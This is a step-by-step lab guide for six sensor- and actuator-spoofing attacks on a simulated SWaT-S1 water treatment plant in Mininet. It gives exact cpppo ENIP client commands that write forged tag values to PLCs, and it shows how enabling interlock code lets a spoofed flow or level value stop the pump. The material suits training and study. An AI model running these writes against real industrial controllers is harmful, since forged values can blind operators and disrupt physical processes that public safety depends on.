# SWaT-S1 Attack Testing — Step-by-Step Walkthrough

> This guide walks you through testing **6 attack scenarios** on the SWaT-S1 water treatment simulation.  
> Follow it from top to bottom like a lab manual.

---

## What You're Working With

Imagine a small water treatment plant:

```
    ┌──────────────────────────────────────────────────────────┐
    │                    WATER TREATMENT PLANT                  │
    │                                                          │
    │   Water In          Raw Water Tank           Water Out    │
    │   ════╗            ┌────────────┐            ╔════       │
    │       ║            │~~~~~~~~~~~~│            ║           │
    │   [MV101]──FIT101──│  ≈≈≈≈≈≈≈≈  │──FIT201──[P101]──→    │
    │    Valve            │  ≈≈≈≈≈≈≈≈  │            Pump       │
    │                    │  ≈≈≈≈≈≈≈≈  │                       │
    │                    │  LIT101 ↕  │                       │
    │                    └────────────┘                        │
    │                     Tank Level                           │
    │                    Sensor (meters)                       │
    │                                                          │
    │   PLC1 watches LIT101 and decides:                       │
    │     • Tank too full (≥0.8m)  → Close valve MV101         │
    │     • Tank too low  (≤0.5m)  → Open valve MV101          │
    │     • Tank dangerously low (≤0.25m) → Stop pump P101     │
    └──────────────────────────────────────────────────────────┘
```

And there's an **attacker** sitting on the same network, able to talk to any PLC:

```
    ┌─────────────────── Network Switch ───────────────────┐
    │                                                       │
    PLC1              PLC2              PLC3            ATTACKER
    192.168.1.10      192.168.1.20      192.168.1.30   192.168.1.77
    Controls:         Monitors:         Monitors:      Can write to
    • MV101 (valve)   • FIT201 (flow)   • LIT301       ANY PLC's
    • P101 (pump)                       (UF tank)      ENIP server
    • LIT101 (level)
```

### The Two Layers — Why Some Attacks Work Better Than Others

```
    ┌─────────────────────────────────────────────────────────────┐
    │                      HOW DATA FLOWS                         │
    │                                                             │
    │   PHYSICAL LAYER (SQLite Database)                          │
    │   ┌──────────────────────────────┐                          │
    │   │  LIT101=0.72  MV101=1       │  ← Physical process      │
    │   │  P101=1       FIT201=2.45   │    reads/writes HERE      │
    │   │  LIT301=0.85                │  ← PLCs also read HERE    │
    │   └──────────────────────────────┘    via self.get/set()    │
    │                                                             │
    │   NETWORK LAYER (ENIP Servers — one per PLC)                │
    │   ┌────────────┐ ┌────────────┐ ┌────────────┐             │
    │   │  PLC1 ENIP │ │  PLC2 ENIP │ │  PLC3 ENIP │             │
    │   │  LIT101:1  │ │  FIT201:2  │ │  LIT301:3  │             │
    │   │  MV101:1   │ │            │ │            │             │
    │   │  P101:1    │ │            │ │            │             │
    │   └────────────┘ └────────────┘ └────────────┘             │
    │        ↑               ↑              ↑                    │
    │        │               │              │                    │
    │   ATTACKER can write to any ENIP server!                   │
    │                                                             │
    │   BUT: PLC1 reads FIT201 and LIT301 FROM the ENIP servers  │
    │         (via self.receive) — so Attacks 5 & 6 actually     │
    │         inject data into PLC1's decision process!           │
    └─────────────────────────────────────────────────────────────┘
```

---

## Phase 0: Setup & Normal Operation (Do This First)

### Step 1 — Open a Terminal on Your Ubuntu Machine

SSH in or open a terminal directly. Everything runs on Linux with `sudo`.

### Step 2 — Navigate to the Project

```bash
cd /path/to/minicps/examples/swat-s1
```

### Step 3 — Initialize the Database (Only Once)

```bash
sudo python init.py
```

You should see:
```
swat_s1_db.sqlite successfully created.
```

> If you see "already exists", that's fine — it means you ran it before.

### Step 4 — Create the Logs Directory

```bash
mkdir -p logs
```

### Step 5 — Start the Simulation

```bash
sudo python run.py
```

You will see something like:
```
*** Creating network
*** Adding hosts:
plc1 plc2 plc3 attacker s1
*** Adding links:
...
*** Starting network
*** Ping: testing ping reachability
plc1 -> plc2 plc3 attacker
...
mininet>
```

You are now at the **Mininet prompt**. The PLCs and physical process are running in the background.

### Step 6 — Watch Normal Operation

Open a second view of the process log:

```bash
mininet> s1 tail -f logs/process.log
```

You should see the tank level changing:
```
DEBUG tank1_level: 0.80142   delta: 0.00142
DEBUG tank1_level: 0.80283   delta: 0.00142
...
INFO PLC1 - lit101 over H -> close mv101.
DEBUG tank1_level: 0.79858   delta: -0.00142
...
INFO PLC1 - lit101 under L -> open mv101.
```

**What's happening**: The tank fills up to ~0.8m, PLC1 closes the valve, the tank drains to ~0.5m, PLC1 opens the valve. This repeats forever. **This is normal, healthy operation.**

Press `Ctrl+C` to stop watching.

### Step 7 — Verify You Can Read PLC Tags

Try reading a value from PLC1's ENIP server:

```bash
mininet> attacker python -m cpppo.server.enip.client --print --address 192.168.1.10 'LIT101:1'
```

You should see something like:
```
LIT101:1 = [0.65432]
```

This confirms the attacker can communicate with PLC1. **You're ready to attack.**

---

## Phase 1: Attack 1 — Spoofing the Water Level Sensor

### What You're Doing

You are the attacker. You're going to **lie about the water level**. You'll write a fake value to PLC1's ENIP server tag `LIT101:1`, making it show the tank is almost empty (0.4m), even though it might actually be almost full.

```
    BEFORE ATTACK                          DURING ATTACK
    
    Real level: 0.75m                      Real level: 0.75m
    PLC1 sees:  0.75m ← from SQLite       PLC1 sees:  0.75m ← still from SQLite
    ENIP shows: 0.75m                      ENIP shows: 0.40m ← ATTACKER wrote this!
    HMI sees:   0.75m ← from ENIP         HMI sees:   0.40m ← WRONG! reads from ENIP
```

### Step 1 — Read the Current Real Value

```bash
mininet> attacker python -m cpppo.server.enip.client --print --address 192.168.1.10 'LIT101:1'
```

**Write down** the value you see. For example: `LIT101:1 = [0.72345]`

### Step 2 — Inject the Fake Value

```bash
mininet> attacker python -m cpppo.server.enip.client --address 192.168.1.10 'LIT101:1=0.400'
```

No output means success.

### Step 3 — Verify the Spoofed Value

```bash
mininet> attacker python -m cpppo.server.enip.client --print --address 192.168.1.10 'LIT101:1'
```

You should now see:
```
LIT101:1 = [0.4]
```

**You just made the ENIP server lie.** Any HMI or SCADA reading from PLC1's ENIP server now sees 0.4m instead of the real level.

### Step 4 — Check If PLC1 Was Fooled

```bash
mininet> plc1 tail -5 logs/plc1.log
```

Look at the output. PLC1 will still show the **real** value because it reads from SQLite:
```
DEBUG plc1 lit101: 0.72345
```

### What Happened Behind the Scenes

```
    ATTACKER wrote to PLC1's ENIP server:
    
    ┌──────────────┐     writes 0.4     ┌──────────────┐
    │   ATTACKER   │ ──────────────────→ │  PLC1 ENIP   │
    │ 192.168.1.77 │                     │  LIT101:1    │
    └──────────────┘                     └──────┬───────┘
                                                │
                                     Any SCADA/HMI reading
                                     from ENIP sees 0.4m
                                     
    Meanwhile, PLC1 still reads from SQLite:
    
    ┌──────────────┐     reads 0.72     ┌──────────────┐
    │     PLC1     │ ←───────────────── │    SQLite     │
    │  main_loop   │                     │  LIT101=0.72 │
    └──────────────┘                     └──────────────┘
    PLC1 makes decisions based on 0.72 (correct value)
```

> **Key takeaway**: PLC1 reads LIT101 from the **SQLite database**, NOT from its own ENIP server. So spoofing the ENIP tag **blinds monitoring systems** (HMI/SCADA) but doesn't directly fool PLC1's control logic. This is still dangerous because operators can't see the real state of the plant.

---

## Phase 2: Attack 2 — Forcing the Valve to Stay Open

### What You're Doing

You're going to **overwrite the MV101 actuator tag** on PLC1's ENIP server, making it appear that the valve is open even if PLC1 just closed it.

```
    Normal:                              Under Attack:
    
    PLC1 decides: "Tank full,            PLC1 decides: "Close valve"
      close valve"                       PLC1 writes MV101=0 to ENIP
    ENIP: MV101=0 (closed)              Attacker writes MV101=1 (open!)
    HMI:  Valve CLOSED ✓                HMI:  Valve OPEN  ← WRONG!
```

### Step 1 — Check Current Valve State

```bash
mininet> attacker python -m cpppo.server.enip.client --print --address 192.168.1.10 'MV101:1'
```

You'll see either `[0]` (closed) or `[1]` (open).

### Step 2 — Force the Valve "Open" on ENIP

```bash
mininet> attacker python -m cpppo.server.enip.client --address 192.168.1.10 'MV101:1=1'
```

### Step 3 — Verify

```bash
mininet> attacker python -m cpppo.server.enip.client --print --address 192.168.1.10 'MV101:1'
```

Expected: `MV101:1 = [1]`

### Step 4 — Watch What Happens

```bash
mininet> plc1 tail -5 logs/plc1.log
```

If PLC1 recently decided to close the valve, you'll see:
```
INFO PLC1 - lit101 over H -> close mv101.
```

But the ENIP server still shows `MV101=1` (open). **The operator would see the valve as open when it's actually closed.**

### What Happened Behind the Scenes

```
    Timeline:
    
    T=0   PLC1 reads LIT101=0.82 from SQLite
    T=0   PLC1 decides: "Too high → close valve"
    T=0   PLC1 writes to SQLite:  MV101=0 (closed)  ← REAL state
    T=0   PLC1 writes to ENIP:   MV101:1=0 (closed)
    T=1   ATTACKER writes to ENIP: MV101:1=1 (OPEN!) ← FAKE state
    T=1   Anyone reading ENIP sees: valve is OPEN
    T=1   But SQLite still says: MV101=0 (closed)    ← Truth
    T=1   Physical process reads SQLite → valve stays closed
```

> **Key takeaway**: You're creating a **discrepancy** between what PLC1 actually did and what the monitoring network shows. Operators are deceived.

---

## Phase 3: Attack 3 — Stopping the Pump (on ENIP)

### What You're Doing

You're telling PLC1's ENIP server that pump P101 is OFF, even if PLC1 has it running.

```
    Think of it like this:
    
    🚗 Real dashboard: Engine RPM = 3000 (running)
    📱 Remote app shows: Engine RPM = 0 (off!) ← Hacked display
    
    Same thing here:
    💧 Real pump: RUNNING (P101=1 in SQLite)
    📊 ENIP shows: OFF (P101=0 on network) ← Attacker's lie
```

### Step 1 — Check Current Pump State

```bash
mininet> attacker python -m cpppo.server.enip.client --print --address 192.168.1.10 'P101:1'
```

### Step 2 — Force Pump "Off" on ENIP

```bash
mininet> attacker python -m cpppo.server.enip.client --address 192.168.1.10 'P101:1=0'
```

### Step 3 — Verify

```bash
mininet> attacker python -m cpppo.server.enip.client --print --address 192.168.1.10 'P101:1'
```

Expected: `P101:1 = [0]`

> **Key takeaway**: Same pattern as Attack 2 — the actual pump in SQLite is unchanged. But operators and automated monitoring see wrong data. In a real plant, an operator seeing "pump off" might try to start a backup pump, causing **excess outflow**.

---

## Phase 4: Attack 4 — The Combined Attack (Most Dangerous)

### What You're Doing

You're doing Attacks 2 and 3 **at the same time**: forcing ENIP to show valve=OPEN and pump=OFF. Maximum deception.

```
    ╔══════════════════════════════════════════════════════╗
    ║           COMBINED ATTACK — Maximum Deception        ║
    ╠══════════════════════════════════════════════════════╣
    ║                                                      ║
    ║  What's Real:         │  What ENIP Shows:            ║
    ║  ─────────────────────│────────────────────────────── ║
    ║  MV101 = 0 (closed)   │  MV101 = 1 (OPEN!)          ║
    ║  P101  = 1 (running)  │  P101  = 0 (OFF!)           ║
    ║  Level = 0.65m        │  Level = 0.65m (correct)     ║
    ║                       │                              ║
    ║  What the operator sees and thinks:                  ║
    ║  "Valve is OPEN, pump is OFF... the tank should      ║
    ║   be filling fast! But the level isn't changing??     ║
    ║   The level sensor must be broken!"                  ║
    ║                                                      ║
    ║  Result: CONFUSION → Wrong manual decisions          ║
    ╚══════════════════════════════════════════════════════╝
```

### Step 1 — Launch Both Writes at Once

```bash
mininet> attacker python -m cpppo.server.enip.client --address 192.168.1.10 'MV101:1=1' 'P101:1=0'
```

> You can write **multiple tags in one command** by listing them one after another.

### Step 2 — Verify Both Tags

```bash
mininet> attacker python -m cpppo.server.enip.client --print --address 192.168.1.10 'MV101:1' 'P101:1'
```

Expected:
```
MV101:1 = [1]
P101:1 = [0]
```

### Step 3 — Compare with the Real Physical State

```bash
mininet> s1 tail -3 logs/process.log
```

The tank level still behaves normally — proving the **physical process reads from SQLite**, not ENIP.

> **Key takeaway**: The combined attack creates **maximum confusion** in the monitoring layer. The data doesn't make sense to the operator, which is exactly the attacker's goal — cause panic and wrong manual interventions.

---

## Phase 5: Attack 5 — Spoofing the Flow Sensor (FIT201 on PLC2)

### ⚠️ This Is Different — This Attack Actually Reaches PLC1's Brain

### What You're Doing

This time you're attacking **PLC2** (192.168.1.20), not PLC1. You're spoofing the flow sensor value that PLC2 serves over ENIP. The key: **PLC1 reads this value over the ENIP network**, so the fake value actually reaches PLC1.

```
    Normal Data Flow:
    
    SQLite ──→ PLC2 reads FIT201 ──→ PLC2 ENIP (FIT201:2=2.45) ──→ PLC1 receives 2.45 ✓
    
    
    Under Attack:
    
    SQLite ──→ PLC2 reads FIT201 ──→ PLC2 ENIP (FIT201:2=2.45) ──→ PLC1 receives...
                                          ↑
                                     ATTACKER writes
                                     FIT201:2=15.0
                                          ↓
                                     PLC2 ENIP now shows 15.0
                                          ↓
                                     PLC1 receives 15.0 ✗ SPOOFED!
```

### Step 1 — Read the Real FIT201 Value from PLC2

```bash
mininet> attacker python -m cpppo.server.enip.client --print --address 192.168.1.20 'FIT201:2'
```

You should see: `FIT201:2 = [2.45]` (or similar)

### Step 2 — Inject a Fake HIGH Flow Reading

```bash
mininet> attacker python -m cpppo.server.enip.client --address 192.168.1.20 'FIT201:2=15.0'
```

This tells PLC2's ENIP that the flow rate is 15.0 m³/h (way above the 10.0 threshold).

### Step 3 — Verify the Spoof

```bash
mininet> attacker python -m cpppo.server.enip.client --print --address 192.168.1.20 'FIT201:2'
```

Expected: `FIT201:2 = [15.0]`

### Step 4 — Check PLC1's Log — Did It Get Fooled?

```bash
mininet> plc1 tail -5 logs/plc1.log
```

Look for this line:
```
DEBUG PLC1 - receive fit201: 15.000000
```

**YES! PLC1 received the fake value!** This works because PLC1 uses `self.receive(FIT201_2, PLC2_ADDR)` — a network read from PLC2's ENIP server.

### Why This Attack Is Different

```
    Attacks 1-4 target PLC1's OWN ENIP server:
    
    ATTACKER → PLC1 ENIP → only affects monitoring
                           PLC1 reads SQLite for decisions
    
    Attack 5 targets PLC2's ENIP server:
    
    ATTACKER → PLC2 ENIP → PLC1 reads FROM PLC2's ENIP!
                           PLC1 actually uses this value!
                           (if interlock code is enabled)
```

### Current Impact

In the **current code**, PLC1 only logs and stores this value — the interlock that would act on it is **commented out**. But if the interlock code were active (lines 91-96 of plc1.py), PLC1 would have shut down pump P101 because `15.0 > 10.0`.

> **Key takeaway**: Attacks on **inter-PLC communication** are the most effective because PLC1 uses `self.receive()` (reads from the ENIP network) to get FIT201. The attacker can inject values directly into PLC1's decision-making.

---

## Phase 6: Attack 6 — Spoofing the UF Tank Level (LIT301 on PLC3)

### What You're Doing

Same approach as Attack 5, but targeting **PLC3** (192.168.1.30). You're spoofing the UF tank level sensor that PLC3 serves to PLC1.

```
    Normal:                              Under Attack:
    
    PLC3 ENIP: LIT301:3 = 0.85          PLC3 ENIP: LIT301:3 = 1.50 ← FAKE!
    PLC1 receives: 0.85 ✓               PLC1 receives: 1.50 ✗ 
    PLC1 thinks: "UF tank is fine"       PLC1 thinks: "UF tank is overflowing!"
    PLC1 action: keep pump running       If interlock ON → STOP PUMP
```

### Step 1 — Read the Real LIT301 Value from PLC3

```bash
mininet> attacker python -m cpppo.server.enip.client --print --address 192.168.1.30 'LIT301:3'
```

Expected: something like `LIT301:3 = [0.85]`

### Step 2 — Inject a Fake HIGH Level

```bash
mininet> attacker python -m cpppo.server.enip.client --address 192.168.1.30 'LIT301:3=1.5'
```

### Step 3 — Verify

```bash
mininet> attacker python -m cpppo.server.enip.client --print --address 192.168.1.30 'LIT301:3'
```

Expected: `LIT301:3 = [1.5]`

### Step 4 — Check PLC1's Log

```bash
mininet> plc1 tail -5 logs/plc1.log
```

Look for:
```
DEBUG PLC1 - receive lit301: 1.500000
```

**PLC1 received the spoofed value.** Same mechanism as Attack 5 — PLC1 uses `self.receive()` to get LIT301 from PLC3's ENIP server.

> **Key takeaway**: By compromising PLC3, you can indirectly influence PLC1. This is a **cross-PLC cascade attack** — you attack one device to control another.

---

## Bonus: Enabling Interlocks to See Full Physical Impact

Attacks 5 & 6 successfully inject data into PLC1, but the code that **acts on** FIT201 and LIT301 is currently commented out. To see real physical damage:

### Step 1 — Stop the Simulation

```bash
mininet> exit
```

### Step 2 — Edit plc1.py (Lines 91–103)

Remove the `#` from the beginning of each line to uncomment the interlock logic:

**Before** (commented out — does nothing):
```python
            #if fit201 > FIT_201_THRESH or lit301 >= LIT_301_M['H']:
            #    # CLOSE p101
            #    self.set(P101, 0)
            #    ...
```

**After** (active — PLC1 now uses FIT201/LIT301 to control the pump):
```python
            if fit201 > FIT_201_THRESH or lit301 >= LIT_301_M['H']:
                # CLOSE p101
                self.set(P101, 0)
                ...
```

### Step 3 — Reset and Restart

```bash
rm swat_s1_db.sqlite
sudo python init.py
sudo python run.py
```

### Step 4 — Run Attack 5 or 6 Again

Now when you spoof `FIT201:2=15.0` or `LIT301:3=1.5`, PLC1 will actually **stop the pump**, and you'll see the tank level rising towards overflow in `logs/process.log`.

---

## Summary: What Each Attack Achieves

```
    Attack Impact Spectrum:
    
    LOW IMPACT ◄──────────────────────────────────────► HIGH IMPACT
    
    Attack 1 (LIT101 spoof)     ██░░░░░░░░  Blinds monitoring only
    Attack 2 (MV101 force)      ██░░░░░░░░  Blinds monitoring only
    Attack 3 (P101 force)       ██░░░░░░░░  Blinds monitoring only
    Attack 4 (Combined)         ████░░░░░░  Max monitoring deception
    Attack 5 (FIT201 on PLC2)   ████████░░  Injects into PLC1's brain*
    Attack 6 (LIT301 on PLC3)   ████████░░  Injects into PLC1's brain*
    
    * Full impact requires enabling interlock code in plc1.py
```

---

## Cleanup

When you're done:

```bash
mininet> exit              # Exit Mininet
sudo mn -c                 # Clean up Mininet state
sudo pkill -f cpppo        # Kill leftover ENIP servers
rm swat_s1_db.sqlite       # Reset database for next run
```

---

## Quick Cheat Sheet

| What You Want to Do | Command (from `mininet>` prompt) |
|---------------------|----------------------------------|
| Read a tag | `attacker python -m cpppo.server.enip.client --print --address <IP> '<TAG>'` |
| Write a tag | `attacker python -m cpppo.server.enip.client --address <IP> '<TAG>=<VALUE>'` |
| Watch tank levels | `s1 tail -f logs/process.log` |
| Watch PLC1 decisions | `plc1 tail -f logs/plc1.log` |
| Watch PLC2 | `plc2 tail -f logs/plc2.log` |
| Watch PLC3 | `plc3 tail -f logs/plc3.log` |
| Check CSV data | `s1 cat logs/data.csv` |
| Exit simulation | `exit` or press `Ctrl+D` |
| Clean up after | `sudo mn -c` |
